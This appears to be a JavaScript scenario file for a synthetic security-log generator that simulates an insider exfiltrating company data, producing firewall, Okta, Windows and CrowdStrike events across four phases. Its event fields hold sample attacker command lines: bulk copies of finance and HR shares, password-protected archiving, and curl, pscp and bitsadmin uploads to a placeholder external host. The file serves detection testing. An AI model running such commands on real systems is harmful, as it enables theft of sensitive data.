'use strict';

/**
 * Data Exfiltration Scenario
 *
 * Simulates an insider or compromised-account exfiltrating sensitive data
 * from the enterprise. The actor is an internal user with valid credentials
 * who progressively moves from normal activity, through suspicious data
 * access patterns, to data staging and finally outbound transfer.
 *
 * MITRE ATT&CK mapping:
 *   T1083  - File and Directory Discovery
 *   T1039  - Data from Network Shared Drive
 *   T1005  - Data from Local System
 *   T1560  - Archive Collected Data
 *   T1048  - Exfiltration Over Alternative Protocol (DNS tunneling)
 *   T1567  - Exfiltration Over Web Service (cloud storage)
 *   T1041  - Exfiltration Over C2 Channel
 */

module.exports = {
  name: 'data-exfil',
  description: 'Simulates data exfiltration with baseline activity, unusual access, staging, and outbound transfer',

  // -----------------------------------------------------------------------
  // Actors
  // -----------------------------------------------------------------------
  actors: {
    insider: {
      type: 'internal_user',
      username: { pattern: 'first.last' },
      email: { pattern: '{{insider.username}}@{{org.domain}}' },
      department: {
        values: ['engineering', 'finance', 'sales'],
        weights: [0.4, 0.3, 0.3]
      },
      ip: { cidr: '10.10.0.0/16' },
      hostname: { pattern: 'role-location-number' },
      os: 'Windows 11'
    },
    file_server: {
      type: 'internal_server',
      hostname: 'FILESRV-NYC-0001',
      ip: { cidr: '10.20.1.0/24' }
    },
    database_server: {
      type: 'internal_server',
      hostname: 'DBSRV-NYC-0002',
      ip: { cidr: '10.20.2.0/24' }
    },
    exfil_destination: {
      type: 'external',
      ip: { cidr: '185.220.100.0/24' },  // known Tor-adjacent range
      geo: 'random_foreign'
    },
    cloud_storage: {
      type: 'external',
      domains: [
        'storage.googleapis.com', 'dropbox.com',
        'mega.nz', 'file.io', 'transfer.sh'
      ]
    }
  },

  // -----------------------------------------------------------------------
  // Phases
  // -----------------------------------------------------------------------
  phases: [
    // -- Phase 1: Normal Baseline Activity -------------------------------
    // The insider goes about their regular work. This establishes a
    // "before" pattern that makes subsequent anomalies detectable.
    {
      name: 'normal_baseline',
      duration: { min: 300000, max: 600000 }, // 5-10 minutes
      events: [
        // Normal web browsing
        {
          sourcetype: 'pan:traffic',
          weight: 0.30,
          overrides: {
            src_ip: '{{insider.ip}}',
            dst_ip: { type: 'random_public' },
            dst_port: 443,
            app: {
              values: ['ssl', 'web-browsing', 'ms-office365', 'ms-teams'],
              weights: [0.3, 0.3, 0.25, 0.15]
            },
            action: 'allow',
            bytes_sent: { min: 500, max: 20000 },
            bytes_received: { min: 2000, max: 500000 },
            session_end_reason: 'tcp-fin',
            rule: 'allow-web-outbound'
          },
          rateMultiplier: 1.0
        },
        // Normal Okta sessions
        {
          sourcetype: 'okta:system',
          weight: 0.20,
          overrides: {
            eventType: {
              values: ['app.auth.sso', 'user.session.start', 'app.access'],
              weights: [0.4, 0.3, 0.3]
            },
            'outcome.result': 'SUCCESS',
            'actor.alternateId': '{{insider.email}}',
            'client.ipAddress': '{{insider.ip}}',
            'client.geographicalContext.country': 'United States'
          },
          rateMultiplier: 0.5
        },
        // Normal file access
        {
          sourcetype: 'WinEventLog:Security',
          weight: 0.25,
          overrides: {
            variant: {
              values: ['4663_object_access', '4624_successful_logon'],
              weights: [0.6, 0.4]
            },
            EventCode: {
              values: [4663, 4624],
              weights: [0.6, 0.4]
            },
            TargetUserName: '{{insider.username}}',
            IpAddress: '{{insider.ip}}',
            ObjectName: {
              values: [
                '\\\\FILESRV\\Shared\\Documents\\report.docx',
                '\\\\FILESRV\\Shared\\Documents\\presentation.pptx',
                '\\\\FILESRV\\Home\\{{insider.username}}\\notes.txt'
              ],
              weights: [0.4, 0.3, 0.3]
            },
            AccessMask: '0x1',  // READ_ACCESS
            ProcessName: 'C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE'
          },
          rateMultiplier: 0.8
        },
        // CrowdStrike — normal processes
        {
          sourcetype: 'crowdstrike:falcon:event',
          weight: 0.25,
          overrides: {
            event_simpleName: {
              values: ['ProcessRollup2', 'DnsRequest', 'NetworkConnectIP4'],
              weights: [0.4, 0.3, 0.3]
            },
            SeverityName: 'Informational',
            UserName: '{{insider.username}}',
            ComputerName: '{{insider.hostname}}',
            ImageFileName: {
              values: [
                'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
                'C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE',
                'C:\\Windows\\explorer.exe'
              ],
              weights: [0.4, 0.35, 0.25]
            }
          },
          rateMultiplier: 0.5
        }
      ]
    },

    // -- Phase 2: Unusual Data Access ------------------------------------
    // The insider starts accessing files and databases outside their
    // normal pattern — high volume reads, accessing restricted shares,
    // querying large datasets.
    {
      name: 'unusual_data_access',
      duration: { min: 600000, max: 900000 }, // 10-15 minutes
      events: [
        // Bulk file access across multiple shares
        {
          sourcetype: 'WinEventLog:Security',
          weight: 0.35,
          overrides: {
            variant: '4663_object_access',
            EventCode: 4663,
            TargetUserName: '{{insider.username}}',
            IpAddress: '{{insider.ip}}',
            ObjectName: {
              values: [
                '\\\\FILESRV\\Finance\\Q4_Revenue\\*',
                '\\\\FILESRV\\HR\\Employee_Records\\*',
                '\\\\FILESRV\\Engineering\\Source_Code\\*',
                '\\\\FILESRV\\Executive\\Board_Materials\\*',
                '\\\\FILESRV\\Legal\\Contracts\\*',
                '\\\\FILESRV\\Sales\\Customer_Data\\*'
              ],
              weights: [0.2, 0.2, 0.15, 0.15, 0.15, 0.15]
            },
            AccessMask: {
              values: ['0x1', '0x3', '0x80'],  // READ, READ_WRITE, READ_ATTRIBUTES
              weights: [0.7, 0.2, 0.1]
            },
            ProcessName: 'C:\\Windows\\explorer.exe'
          },
          rateMultiplier: 5.0  // much higher than baseline
        },
        // Network share enumeration
        {
          sourcetype: 'WinEventLog:Security',
          weight: 0.15,
          overrides: {
            variant: '5140_network_share_access',
            EventCode: 5140,
            TargetUserName: '{{insider.username}}',
            IpAddress: '{{insider.ip}}',
            ShareName: {
              values: [
                '\\\\*\\Finance', '\\\\*\\HR', '\\\\*\\Engineering',
                '\\\\*\\Executive', '\\\\*\\Legal', '\\\\*\\Admin$', '\\\\*\\C$'
              ],
              weights: [0.15, 0.15, 0.15, 0.15, 0.15, 0.15, 0.1]
            },
            AccessMask: '0x1'
          },
          rateMultiplier: 3.0
        },
        // Database queries — large result sets
        {
          sourcetype: 'pan:traffic',
          weight: 0.20,
          overrides: {
            src_ip: '{{insider.ip}}',
            dst_ip: '{{database_server.ip}}',
            dst_port: {
              values: [1433, 1521, 3306],
              weights: [0.5, 0.3, 0.2]
            },
            app: {
              values: ['ms-sql', 'oracle', 'mysql'],
              weights: [0.5, 0.3, 0.2]
            },
            action: 'allow',
            bytes_sent: { min: 500, max: 5000 },       // small query out
            bytes_received: { min: 500000, max: 50000000 },  // large result back
            session_end_reason: 'tcp-fin',
            rule: 'allow-internal-app-traffic'
          },
          rateMultiplier: 3.0
        },
        // CrowdStrike — unusual process activity (database client tools)
        {
          sourcetype: 'crowdstrike:falcon:event',
          weight: 0.15,
          overrides: {
            event_simpleName: 'ProcessRollup2',
            SeverityName: {
              values: ['Informational', 'Low'],
              weights: [0.6, 0.4]
            },
            UserName: '{{insider.username}}',
            ComputerName: '{{insider.hostname}}',
            ImageFileName: {
              values: [
                'C:\\Program Files\\Microsoft SQL Server\\Client SDK\\ODBC\\Tools\\Binn\\SQLCMD.EXE',
                'C:\\Program Files\\PuTTY\\psftp.exe',
                'C:\\Program Files\\WinSCP\\WinSCP.exe',
                'C:\\Windows\\System32\\robocopy.exe',
                'C:\\Windows\\System32\\xcopy.exe'
              ],
              weights: [0.25, 0.2, 0.2, 0.2, 0.15]
            },
            CommandLine: {
              values: [
                'sqlcmd -S {{database_server.hostname}} -Q "SELECT * FROM customers"',
                'robocopy \\\\FILESRV\\Finance C:\\Users\\{{insider.username}}\\staging /E /Z',
                'xcopy \\\\FILESRV\\Engineering\\Source_Code C:\\Temp\\backup\\ /S /E',
                'psftp -batch -b transfer_commands.txt'
              ],
              weights: [0.3, 0.3, 0.25, 0.15]
            }
          },
          rateMultiplier: 2.0
        },
        // Firewall — heavy internal traffic to file server
        {
          sourcetype: 'pan:traffic',
          weight: 0.15,
          overrides: {
            src_ip: '{{insider.ip}}',
            dst_ip: '{{file_server.ip}}',
            dst_port: 445,
            app: 'ms-ds-smb',
            action: 'allow',
            bytes_sent: { min: 200, max: 5000 },
            bytes_received: { min: 1000000, max: 100000000 },  // large downloads
            session_end_reason: 'tcp-fin',
            rule: 'allow-internal-east-west'
          },
          rateMultiplier: 4.0
        }
      ]
    },

    // -- Phase 3: Data Staging -------------------------------------------
    // The insider compresses and optionally encrypts the collected data
    // into archives, preparing for exfiltration.
    {
      name: 'data_staging',
      duration: { min: 300000, max: 600000 }, // 5-10 minutes
      events: [
        // CrowdStrike — compression and archiving tools
        {
          sourcetype: 'crowdstrike:falcon:event',
          weight: 0.40,
          overrides: {
            event_simpleName: 'ProcessRollup2',
            SeverityName: {
              values: ['Low', 'Medium'],
              weights: [0.4, 0.6]
            },
            Tactic: 'Collection',
            Technique: 'Archive Collected Data',
            UserName: '{{insider.username}}',
            ComputerName: '{{insider.hostname}}',
            ImageFileName: {
              values: [
                'C:\\Program Files\\7-Zip\\7z.exe',
                'C:\\Program Files\\WinRAR\\rar.exe',
                'C:\\Windows\\System32\\tar.exe',
                'C:\\Windows\\System32\\compact.exe',
                'C:\\Program Files\\GnuPG\\bin\\gpg.exe'
              ],
              weights: [0.3, 0.25, 0.15, 0.15, 0.15]
            },
            CommandLine: {
              values: [
                '7z a -p C:\\Users\\{{insider.username}}\\staging\\archive.7z C:\\Users\\{{insider.username}}\\staging\\data\\*',
                'rar a -hp C:\\Users\\{{insider.username}}\\Desktop\\backup.rar C:\\Temp\\exfil\\*',
                'tar czf C:\\Users\\{{insider.username}}\\export.tar.gz C:\\Temp\\collected\\',
                'compact /c /s:C:\\Users\\{{insider.username}}\\staging',
                'gpg --symmetric --cipher-algo AES256 C:\\Users\\{{insider.username}}\\staging\\archive.7z'
              ],
              weights: [0.3, 0.25, 0.2, 0.1, 0.15]
            }
          },
          rateMultiplier: 2.0
        },
        // CrowdStrike — file write events for staged archives
        {
          sourcetype: 'crowdstrike:falcon:event',
          weight: 0.25,
          overrides: {
            event_simpleName: 'FileWritten',
            SeverityName: 'Low',
            UserName: '{{insider.username}}',
            ComputerName: '{{insider.hostname}}',
            TargetFileName: {
              values: [
                'C:\\Users\\{{insider.username}}\\staging\\archive.7z',
                'C:\\Users\\{{insider.username}}\\staging\\archive.7z.gpg',
                'C:\\Users\\{{insider.username}}\\Desktop\\backup.rar',
                'C:\\Users\\{{insider.username}}\\export.tar.gz',
                'C:\\Temp\\data_export_2026.zip'
              ],
              weights: [0.25, 0.2, 0.2, 0.2, 0.15]
            },
            Size: { min: 50000000, max: 2000000000 }  // 50MB - 2GB files
          },
          rateMultiplier: 1.0
        },
        // Windows — file creation events
        {
          sourcetype: 'WinEventLog:Security',
          weight: 0.20,
          overrides: {
            variant: '4663_object_access',
            EventCode: 4663,
            TargetUserName: '{{insider.username}}',
            ObjectName: {
              values: [
                'C:\\Users\\{{insider.username}}\\staging\\archive.7z',
                'C:\\Users\\{{insider.username}}\\Desktop\\backup.rar',
                'C:\\Temp\\data_export_2026.zip'
              ],
              weights: [0.4, 0.35, 0.25]
            },
            AccessMask: '0x2',  // WRITE_ACCESS
            ProcessName: {
              values: [
                'C:\\Program Files\\7-Zip\\7z.exe',
                'C:\\Program Files\\WinRAR\\rar.exe',
                'C:\\Windows\\System32\\tar.exe'
              ],
              weights: [0.4, 0.35, 0.25]
            }
          },
          rateMultiplier: 1.5
        },
        // Disk I/O reflected in local traffic
        {
          sourcetype: 'pan:traffic',
          weight: 0.15,
          overrides: {
            src_ip: '{{insider.ip}}',
            dst_ip: '{{insider.ip}}',
            app: 'ms-ds-smb',
            action: 'allow',
            bytes_sent: { min: 100000, max: 10000000 },
            bytes_received: { min: 100000, max: 10000000 },
            rule: 'allow-internal-east-west'
          },
          rateMultiplier: 0.5
        }
      ]
    },

    // -- Phase 4: Exfiltration -------------------------------------------
    // The staged data leaves the network through multiple channels:
    // direct HTTPS uploads, DNS tunneling, and cloud storage services.
    {
      name: 'exfiltration',
      duration: { min: 600000, max: 1200000 }, // 10-20 minutes
      events: [
        // Large outbound HTTPS transfers to external IP
        {
          sourcetype: 'pan:traffic',
          weight: 0.25,
          overrides: {
            src_ip: '{{insider.ip}}',
            dst_ip: '{{exfil_destination.ip}}',
            dst_port: 443,
            app: 'ssl',
            action: {
              values: ['allow', 'deny'],
              weights: [0.8, 0.2]
            },
            bytes_sent: { min: 10000000, max: 500000000 },  // 10MB-500MB per session
            bytes_received: { min: 5000, max: 50000 },       // small ACKs back
            packets_sent: { min: 10000, max: 500000 },
            packets_received: { min: 1000, max: 50000 },
            session_end_reason: {
              values: ['tcp-fin', 'aged-out', 'tcp-rst-from-server'],
              weights: [0.5, 0.3, 0.2]
            },
            rule: {
              values: ['allow-web-outbound', 'deny-data-loss-prevention'],
              weights: [0.8, 0.2]
            }
          },
          rateMultiplier: 2.0
        },
        // Cloud storage uploads (Dropbox, Google Drive, MEGA)
        {
          sourcetype: 'pan:traffic',
          weight: 0.20,
          overrides: {
            src_ip: '{{insider.ip}}',
            dst_ip: { type: 'random_public' },
            dst_port: 443,
            app: {
              values: ['google-drive-web', 'dropbox', 'ssl', 'web-browsing'],
              weights: [0.3, 0.3, 0.25, 0.15]
            },
            action: {
              values: ['allow', 'deny'],
              weights: [0.7, 0.3]
            },
            bytes_sent: { min: 5000000, max: 200000000 },
            bytes_received: { min: 10000, max: 100000 },
            session_end_reason: {
              values: ['tcp-fin', 'aged-out'],
              weights: [0.6, 0.4]
            },
            rule: {
              values: ['allow-web-outbound', 'deny-cloud-storage-upload'],
              weights: [0.7, 0.3]
            },
            url_category: {
              values: ['cloud-storage', 'file-sharing', 'web-based-email'],
              weights: [0.5, 0.3, 0.2]
            }
          },
          rateMultiplier: 2.5
        },
        // DNS tunneling indicators — high-volume, high-entropy DNS
        {
          sourcetype: 'pan:traffic',
          weight: 0.15,
          overrides: {
            src_ip: '{{insider.ip}}',
            dst_port: 53,
            app: 'dns',
            action: 'allow',
            bytes_sent: { min: 200, max: 500 },      // encoded data in queries
            bytes_received: { min: 200, max: 500 },   // encoded data in responses
            // DNS tunneling generates many queries per second
            dst_ip: { type: 'random_public' },
            rule: 'allow-dns',
            // High query rate is the indicator; each event is a DNS query
            // with a long, high-entropy subdomain
            query_domain: {
              type: 'dns_tunnel',
              base_domain: 'cdn-analytics.{{exfil_destination.domain}}',
              subdomain_length: { min: 40, max: 60 }
            }
          },
          rateMultiplier: 8.0  // very high — DNS tunneling is chatty
        },
        // CrowdStrike — suspicious network activity detection
        {
          sourcetype: 'crowdstrike:falcon:event',
          weight: 0.15,
          overrides: {
            event_simpleName: {
              values: ['SuspiciousActivity', 'NetworkConnectIP4', 'DnsRequest'],
              weights: [0.3, 0.4, 0.3]
            },
            SeverityName: {
              values: ['Medium', 'High'],
              weights: [0.4, 0.6]
            },
            Tactic: 'Exfiltration',
            Technique: {
              values: [
                'Exfiltration Over Web Service',
                'Exfiltration Over Alternative Protocol',
                'Automated Exfiltration'
              ],
              weights: [0.4, 0.35, 0.25]
            },
            UserName: '{{insider.username}}',
            ComputerName: '{{insider.hostname}}',
            RemoteAddressIP4: '{{exfil_destination.ip}}',
            DetectDescription: {
              values: [
                'Large outbound data transfer to uncategorized external IP',
                'DNS query volume anomaly — possible DNS tunneling',
                'Bulk upload to cloud storage service outside business context'
              ],
              weights: [0.4, 0.35, 0.25]
            }
          },
          rateMultiplier: 1.0
        },
        // CrowdStrike — process activity during exfil
        {
          sourcetype: 'crowdstrike:falcon:event',
          weight: 0.10,
          overrides: {
            event_simpleName: 'ProcessRollup2',
            SeverityName: 'Medium',
            Tactic: 'Exfiltration',
            UserName: '{{insider.username}}',
            ComputerName: '{{insider.hostname}}',
            ImageFileName: {
              values: [
                'C:\\Windows\\System32\\curl.exe',
                'C:\\Program Files\\PuTTY\\pscp.exe',
                'C:\\Program Files\\WinSCP\\WinSCP.exe',
                'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
                'C:\\Windows\\System32\\bitsadmin.exe'
              ],
              weights: [0.25, 0.2, 0.2, 0.2, 0.15]
            },
            CommandLine: {
              values: [
                'curl -X PUT -T archive.7z.gpg https://{{exfil_destination.ip}}/upload',
                'pscp -scp archive.7z.gpg user@{{exfil_destination.ip}}:/tmp/',
                'WinSCP.exe /upload archive.7z.gpg /remotepath=/incoming',
                'bitsadmin /transfer exfil /upload https://{{exfil_destination.ip}}/drop archive.7z.gpg'
              ],
              weights: [0.3, 0.25, 0.25, 0.2]
            }
          },
          rateMultiplier: 0.8
        },
        // Okta — session remains active during exfil (no logout)
        {
          sourcetype: 'okta:system',
          weight: 0.05,
          overrides: {
            eventType: 'user.session.extend',
            'outcome.result': 'SUCCESS',
            'actor.alternateId': '{{insider.email}}',
            'client.ipAddress': '{{insider.ip}}'
          },
          rateMultiplier: 0.1
        },
        // Windows — file read events as staged files are transmitted
        {
          sourcetype: 'WinEventLog:Security',
          weight: 0.10,
          overrides: {
            variant: '4663_object_access',
            EventCode: 4663,
            TargetUserName: '{{insider.username}}',
            ObjectName: {
              values: [
                'C:\\Users\\{{insider.username}}\\staging\\archive.7z',
                'C:\\Users\\{{insider.username}}\\staging\\archive.7z.gpg',
                'C:\\Users\\{{insider.username}}\\Desktop\\backup.rar'
              ],
              weights: [0.4, 0.35, 0.25]
            },
            AccessMask: '0x1',  // READ_ACCESS
            ProcessName: {
              values: [
                'C:\\Windows\\System32\\curl.exe',
                'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
                'C:\\Program Files\\PuTTY\\pscp.exe'
              ],
              weights: [0.4, 0.35, 0.25]
            }
          },
          rateMultiplier: 1.5
        }
      ]
    }
  ]
};
